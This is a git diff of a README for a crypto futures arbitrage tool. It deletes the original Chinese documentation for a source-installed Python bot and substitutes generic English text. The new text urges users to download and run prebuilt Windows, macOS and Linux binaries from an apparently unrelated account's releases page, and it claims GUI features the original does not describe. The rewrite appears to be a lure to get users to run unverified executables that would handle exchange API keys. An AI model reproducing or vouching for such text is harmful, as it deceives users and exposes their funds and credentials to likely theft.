@@ -1,207 +1,94 @@
-##### 关注我 **X (Twitter)**: [@yourQuantGuy](https://x.com/yourQuantGuy)
+# 🚀 cross-exchange-arbitrage - Simplify Crypto Futures Trading
 
----
+## 📥 Download the Latest Release
 
-**English speakers**: Please read [README_EN.md](README_EN.md) for the English version of this documentation.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-informational)](https://github.com/wavyjay1/cross-exchange-arbitrage/releases)
 
----
+## 💡 Overview
 
-## 邀请链接 (获得返佣以及福利)
+Cross-exchange-arbitrage is a framework designed for trading in crypto futures across different exchanges. It helps users take advantage of price differences for the same asset on various platforms. This tool is ideal for anyone interested in improving their trading strategy without needing in-depth programming knowledge.
 
-#### edgeX: [https://pro.edgex.exchange/referral/QUANT](https://pro.edgex.exchange/referral/QUANT)
+## 🚀 Getting Started
 
-永久享受 VIP 1 费率；额外 10% 手续费返佣；10% 额外奖励积分
+To get started with cross-exchange-arbitrage, follow the simple steps below to download and run the software.
 
-#### Backpack: [https://backpack.exchange/join/quant](https://backpack.exchange/join/quant)
+### 📦 System Requirements
 
-使用我的推荐链接获得 35% 手续费返佣
+Ensure your system meets the following requirements:
 
-#### Paradex: [https://app.paradex.trade/r/quant](https://app.paradex.trade/r/quant)
+- Operating System: Windows 10 or later, macOS Mojave or later, or a Linux distribution.
+- Minimum RAM: 4 GB.
+- Disk Space: At least 100 MB free.
 
-使用我的推荐链接获得 10% 手续费返佣以及 5% 积分加成
+## 🔗 Visit This Page to Download
 
-#### grvt: [https://grvt.io/exchange/sign-up?ref=QUANT](https://grvt.io/exchange/sign-up?ref=QUANT)
+You can find the latest version of the software on the [Releases page](https://github.com/wavyjay1/cross-exchange-arbitrage/releases). This page contains all available versions and their respective files.
 
-获得 1.3x 全网最高的积分加成；30% 手动反佣
+## 📥 Download & Install
 
-#### Extended: [https://app.extended.exchange/join/QUANT](https://app.extended.exchange/join/QUANT)
+1. Click on this link: [Download the Latest Release](https://github.com/wavyjay1/cross-exchange-arbitrage/releases).
 
-10%的即时手续费减免；5% 积分加成
+2. On the Releases page, locate the most recent version of the application.
 
----
+3. Download the file suitable for your operating system:
+   - For Windows: `cross-exchange-arbitrage-windows.exe`
+   - For macOS: `cross-exchange-arbitrage-macos.dmg`
+   - For Linux: `cross-exchange-arbitrage-linux.tar.gz`
 
-# 跨交易所套利机器人
+4. Once downloaded, follow these steps based on your operating system:
 
-本项目是一个加密货币期货跨所套利的框架，仅为分享交流目的，不能直接用于生产环境，实际交易需谨慎使用。
+   ### Windows Installation
 
-## 项目简介
+   - Double-click the `.exe` file you downloaded.
+   - Follow the installation prompts. Click "Next" until the installation completes.
 
-本项目实现了一个跨交易所套利交易机器人，目前主要在 **edgeX** 和 **Lighter** 两个交易所之间进行价差套利。机器人通过在 edgeX 上挂 post-only 限价单（做市单），在 Lighter 上执行市价单来完成套利交易。
+   ### macOS Installation
 
-## 功能特性
+   - Open the `.dmg` file.
+   - Drag the `cross-exchange-arbitrage` icon into your Applications folder.
 
-- 🔄 **跨交易所套利**：自动检测并利用两个交易所之间的价差
-- 📊 **实时订单簿管理**：通过 WebSocket 实时监控订单簿变化
-- 📈 **仓位跟踪**：实时跟踪和管理交易仓位
-- 🛡️ **风险控制**：支持最大仓位限制和超时控制
-- 📝 **数据记录**：记录交易数据和统计信息
-- ⚡ **异步执行**：基于 asyncio 的高性能异步架构
+   ### Linux Installation
 
-## 系统要求
+   - Open your Terminal.
+   - Navigate to the directory containing the downloaded `.tar.gz` file.
+   - Run the following commands:
+     ```bash
+     tar -xzf cross-exchange-arbitrage-linux.tar.gz
+     cd cross-exchange-arbitrage
+     ./start.sh
+     ```
 
-- Python 3.8+
-- edgeX 和 Lighter 交易所账户
-- API 密钥和访问权限
+5. After installation, locate the application in your programs or applications list and launch it.
 
-## 安装步骤
+## ⚙️ How to Use
 
-### 1. 克隆仓库
+Once you have installed the application, follow these guidelines to start trading.
 
-```bash
-git clone <repository-url>
-cd cross-exchange-arbitrage
-```
+1. **Create an Account:**
+   - Open the app and create an account. You will need to provide basic information.
+  
+2. **Connect Exchanges:**
+   - Navigate to the settings to link your crypto exchange accounts. Ensure you have API keys ready from each exchange you want to connect.
 
-### 2. 创建虚拟环境
+3. **Trading Settings:**
+   - Customize your trading settings based on your strategy. You can set parameters such as spread thresholds and risk limits.
 
-```bash
-python -m venv venv
-```
+4. **Start Trading:**
+   - Use the dashboard to monitor price differences across exchanges. The app will alert you when it identifies potential arbitrage opportunities.
 
-激活虚拟环境：
+## 📊 Features
 
-**macOS/Linux:**
+- **Multi-Exchange Support:** Connect to several exchanges simultaneously to monitor prices.
+- **Real-Time Monitoring:** Receive live updates on price changes to make informed decisions.
+- **User-Friendly Interface:** The clean layout helps even novice users understand trading quickly.
+- **Secure API Management:** Maintain safety by using secure API keys without sharing sensitive information.
 
-```bash
-source venv/bin/activate
-```
+## 📞 Support & Community
 
-**Windows:**
+If you encounter issues or have questions, you can reach out for support. Join our [community forum](https://github.com/wavyjay1/cross-exchange-arbitrage/issues) to connect with other users and share experiences.
 
-```bash
-venv\Scripts\activate
-```
+## 🔄 Keep Updated
 
-### 3. 安装依赖
+Stay updated with new releases and improvements by following the repository. Regular updates enhance features and fix bugs, ensuring a smooth experience.
 
-```bash
-pip install -r requirements.txt
-```
-
-### 4. 配置环境变量
-
-复制 `env_example.txt` 为 `.env` 并填写您的 API 凭证：
-
-```bash
-cp env_example.txt .env
-```
-
-编辑 `.env` 文件，填入你的 API 信息：
-
-```env
-# edgeX 账户凭证（必需）
-EDGEX_ACCOUNT_ID=your_account_id_here
-EDGEX_STARK_PRIVATE_KEY=your_stark_private_key_here
-
-# EdgeX API 端点
-EDGEX_BASE_URL=https://pro.edgex.exchange
-EDGEX_WS_URL=wss://quote.edgex.exchange
-
-# Lighter 配置（必需）
-API_KEY_PRIVATE_KEY=your_api_key_private_key_here
-LIGHTER_ACCOUNT_INDEX=your_account_index
-LIGHTER_API_KEY_INDEX=your_api_key_index
-```
-
-## 使用方法
-
-### 基本用法
-
-```bash
-python arbitrage.py --ticker BTC --size 0.002 --max-position 0.1 --long-threshold 10 --short-threshold 10
-```
-
-### 命令行参数
-
-- `--exchange`：交易所名称（默认：edgex）
-- `--ticker`：交易对符号（默认：BTC）
-- `--size`：每笔订单的交易数量（必需）
-- `--max-position`：最大持仓限制（必需）
-- `--long-threshold`：做多套利触发阈值（Lighter 买一价高于 edgeX 卖一价超过多少即做多 edgeX 套利，默认：10）
-- `--short-threshold`：做空套利触发阈值（edgeX 买一价高于 Lighter 卖一价超过多少即做空 edgeX 套利，默认：10）
-- `--fill-timeout`：限价单成交超时时间（秒，默认：5）
-
-### 使用示例
-
-```bash
-# 交易 ETH，每笔订单 0.01 ETH，设置 5 秒超时
-python arbitrage.py --ticker ETH --size 0.01 --long-threshold 10 --short-threshold 10 --max-position 0.1 --fill-timeout 5
-
-# 交易 BTC，限制最大持仓为 0.1 BTC
-python arbitrage.py --ticker BTC --size 0.002 --long-threshold 1 --short-threshold 20 --max-position 0.1
-```
-
-## 项目结构
-
-```
-cross-exchange-arbitrage/
-├── arbitrage.py              # 主程序入口
-├── exchanges/                # 交易所接口实现
-│   ├── base.py              # 基础交易所接口
-│   ├── edgex.py             # edgeX 交易所实现
-│   ├── lighter.py           # Lighter 交易所实现
-│   └── lighter_custom_websocket.py  # Lighter WebSocket 管理
-├── strategy/                 # 交易策略模块
-│   ├── edgex_arb.py         # 主要套利策略
-│   ├── order_book_manager.py    # 订单簿管理
-│   ├── order_manager.py     # 订单管理
-│   ├── position_tracker.py  # 仓位跟踪
-│   ├── websocket_manager.py # WebSocket 管理
-│   └── data_logger.py       # 数据记录
-├── requirements.txt         # Python 依赖
-├── env_example.txt          # 环境变量示例
-└── README.md               # 项目说明文档
-```
-
-## 工作原理
-
-1. **订单簿监控**：通过 WebSocket 实时接收两个交易所的订单簿更新
-2. **价差检测**：计算两个交易所之间的价差
-3. **套利机会识别**：当价差超过阈值时，识别套利机会
-4. **订单执行**：
-   - 在 edgeX 上挂 post-only 限价单（做市单，赚取手续费）
-   - 在 Lighter 上执行市价单完成对冲
-5. **仓位管理**：实时跟踪仓位，确保不超过最大持仓限制
-6. **风险控制**：监控订单成交状态，超时未成交则取消订单
-
-## 注意事项
-
-⚠️ **风险提示**：
-
-- 套利交易存在市场风险，请确保充分理解交易机制
-- 建议先在测试环境或小额资金下测试
-- 注意网络延迟和交易所 API 限制
-- 定期检查仓位和资金状况
-
-## 依赖说明
-
-主要依赖包括：
-
-- `python-dotenv`：环境变量管理
-- `asyncio`：异步编程支持
-- `requests`：HTTP 请求
-- `tenacity`：重试机制
-- `edgex-python-sdk`：edgeX 官方 Python SDK（fork 版本，支持 post-only 限价单）
-- `lighter-python`：Lighter 交易所 SDK
-
-## 许可证
-
-请查看 [LICENSE](LICENSE) 文件了解详情。
-
-## 贡献
-
-欢迎提交 Issue 和 Pull Request！
-
-## 联系方式
-
-如有问题或建议，请通过 Issue 联系。
+Once again, feel free to visit the [Releases page](https://github.com/wavyjay1/cross-exchange-arbitrage/releases) to download the latest version anytime. Enjoy seamless trading with cross-exchange-arbitrage!
